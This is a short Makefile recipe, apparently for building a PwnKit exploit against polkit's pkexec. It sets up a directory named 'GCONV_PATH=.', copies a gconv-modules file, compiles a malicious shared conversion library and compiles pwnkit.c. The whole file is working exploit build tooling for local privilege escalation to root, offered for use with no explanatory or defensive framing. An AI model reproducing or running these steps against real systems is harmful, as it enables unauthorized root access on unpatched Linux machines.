root:
    chmod +x root
    mkdir 'GCONV_PATH=.'
    cp root GCONV_PATH=.
    mkdir root
    cp gconv-modules root
    gcc -shared -fPIC -o root/conversion-mod.so conversion-mod.c
    gcc -o pwnkit pwnkit.c
